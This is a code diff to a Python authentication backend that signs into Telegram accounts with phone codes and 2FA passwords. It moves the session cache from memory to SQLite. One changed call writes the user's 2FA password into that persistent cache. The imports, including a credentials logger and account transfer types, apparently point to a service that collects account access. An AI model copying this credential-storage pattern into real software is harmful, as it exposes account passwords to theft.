@@ -15,7 +15,9 @@ from backend.core_engine.pyrogram_client import get_session_manager
 from backend.core_engine.credentials_logger import generate_email_for_account, get_email_hash
 from backend.models.database import (
     AuthStatus, DeliveryStatus, TransferMode as DBTransferMode,
-    add_account, get_account, update_account, log_auth_action
+    add_account, get_account, update_account, log_auth_action,
+    persistent_cache_set, persistent_cache_get, persistent_cache_clear,
+    persistent_cache_check_timeout, SESSION_CACHE_TTL_SECONDS
 )
 
 logger = get_logger("AuthAPI")
@@ -23,7 +25,8 @@ router = APIRouter(tags=["Authentication"])
 
 from config import API_ID, API_HASH
 
-session_cache: Dict[str, Dict] = {}
+# ============== Session Cache (RAM + SQLite Persistent) ==============
+_ram_cache_v2: Dict[str, Dict] = {}
 
 # Per-phone locks for concurrency isolation
 _v2_auth_locks: Dict[str, asyncio.Lock] = {}
@@ -34,7 +37,7 @@ def _get_v2_lock(phone: str) -> asyncio.Lock:
         _v2_auth_locks[phone] = asyncio.Lock()
     return _v2_auth_locks[phone]
 
-SESSION_TIMEOUT_SECONDS = 30 * 60
+SESSION_TIMEOUT_SECONDS = SESSION_CACHE_TTL_SECONDS
 
 
 class InitAuthRequest(BaseModel):
@@ -52,31 +55,32 @@ def get_pyrogram():
     return get_session_manager(API_ID, API_HASH, "sessions")
 
 
-def cache_session_data(phone: str, **kwargs):
-    if phone not in session_cache:
-        session_cache[phone] = {"started_at": datetime.utcnow()}
-    session_cache[phone].update(kwargs)
+async def cache_session_data(phone: str, **kwargs):
+    if phone not in _ram_cache_v2:
+        _ram_cache_v2[phone] = {"started_at": datetime.utcnow().isoformat()}
+    for k, v in kwargs.items():
+        _ram_cache_v2[phone][k] = v.isoformat() if isinstance(v, datetime) else v
+    await persistent_cache_set(phone, **kwargs)
 
 
-def get_cached_data(phone: str, key: str = None):
-    if phone not in session_cache:
-        return None
-    if key:
-        return session_cache[phone].get(key)
-    return session_cache[phone]
+async def get_cached_data(phone: str, key: str = None):
+    if phone in _ram_cache_v2:
+        if key:
+            return _ram_cache_v2[phone].get(key)
+        return _ram_cache_v2[phone]
+    data = await persistent_cache_get(phone, key)
+    if data and not key:
+        _ram_cache_v2[phone] = data
+    return data
 
 
-def clear_session_cache(phone: str):
-    if phone in session_cache:
-        del session_cache[phone]
+async def clear_session_cache(phone: str):
+    _ram_cache_v2.pop(phone, None)
+    await persistent_cache_clear(phone)
 
 
-def check_session_timeout(phone: str) -> bool:
-    data = get_cached_data(phone)
-    if not data or "started_at" not in data:
-        return False
-    elapsed = (datetime.utcnow() - data["started_at"]).total_seconds()
-    return elapsed > SESSION_TIMEOUT_SECONDS
+async def check_session_timeout(phone: str) -> bool:
+    return await persistent_cache_check_timeout(phone)
 
 
 @router.post("/auth/init")
@@ -111,7 +115,7 @@ async def _do_v2_init(phone: str, request: InitAuthRequest):
         email_hash=email_hash
     )
     
-    cache_session_data(phone, started_at=datetime.utcnow())
+    await cache_session_data(phone, started_at=datetime.utcnow())
     
     manager = get_pyrogram()
     result = await manager.send_code(phone)
@@ -127,7 +131,7 @@ async def _do_v2_init(phone: str, request: InitAuthRequest):
             first_name=user_info.get("first_name")
         )
         
-        cache_session_data(phone, telegram_id=telegram_id)
+        await cache_session_data(phone, telegram_id=telegram_id)
         await log_auth_action(phone, "init", "already_logged_in")
         
         return {
@@ -166,8 +170,8 @@ async def verify_auth(request: VerifyAuthRequest):
 async def _do_v2_verify(phone: str, request: VerifyAuthRequest):
     log_request(logger, "POST", f"/auth/verify/{phone}", None)
     
-    if check_session_timeout(phone):
-        clear_session_cache(phone)
+    if await check_session_timeout(phone):
+        await clear_session_cache(phone)
         raise HTTPException(status_code=408, detail="Session timeout (30 min). Please start again.")
     
     account = await get_account(phone)
@@ -191,7 +195,7 @@ async def _do_v2_verify(phone: str, request: VerifyAuthRequest):
                 has_2fa=False
             )
             
-            cache_session_data(phone, telegram_id=telegram_id)
+            await cache_session_data(phone, telegram_id=telegram_id)
             await log_auth_action(phone, "verify_code", "success")
             
             return {
@@ -231,7 +235,7 @@ async def _do_v2_verify(phone: str, request: VerifyAuthRequest):
                 first_name=user_info.get("first_name")
             )
             
-            cache_session_data(phone, telegram_id=telegram_id, two_fa_password=request.password)
+            await cache_session_data(phone, telegram_id=telegram_id, two_fa_password=request.password)
             await log_auth_action(phone, "verify_2fa", "success")
             
             return {
